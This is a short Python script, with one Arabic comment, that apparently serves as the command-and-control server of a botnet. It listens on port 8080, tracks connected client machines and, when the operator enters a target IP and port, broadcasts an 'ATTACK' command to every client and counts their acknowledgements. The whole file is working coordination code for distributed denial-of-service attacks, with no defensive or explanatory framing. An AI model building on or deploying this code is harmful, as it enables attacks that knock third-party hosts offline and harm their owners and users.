import socket
import threading

clients = []
attack_count = 0

def handle_client(conn, addr):
    global attack_count
    clients.append(conn)
    print(f"Client connected: {addr}. Total clients: {len(clients)}")
    while True:
        try:
            data = conn.recv(1024).decode('utf-8')
            if data.startswith("ATTACK"):
                _, ip, port = data.split()
                # إرسال الأمر للهجوم
                send_attack_command(ip, int(port))
                print(f"Attack command sent to {len(clients)} clients.")
            elif data.startswith("ACK"):
                attack_count += 1
                _, ip, port = data.split()
                print(f"Attack on {ip}:{port} acknowledged. {attack_count} clients have responded.")
        except Exception as e:
            print(f"An error occurred: {e}")
            break
    clients.remove(conn)
    conn.close()

def server_handler(host, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen(5)
        print("Server listening...")
        while True:
            conn, addr = s.accept()
            threading.Thread(target=handle_client, args=(conn, addr)).start()

def send_attack_command(ip, port):
    for client in clients:
        try:
            command = f"ATTACK {ip} {port}"
            client.sendall(command.encode('utf-8'))
        except Exception as e:
            print(f"Error sending attack command: {e}")

if __name__ == "__main__":
    server_ip = "0.0.0.0"
    server_port = 8080

    threading.Thread(target=server_handler, args=(server_ip, server_port)).start()

    while True:
        command = input("Enter command (-IP <ip> -p <port>): ")
        if command.startswith("-IP"):
            _, ip, _, port = command.split()
            send_attack_command(ip, int(port))
            print("Attack command sent.")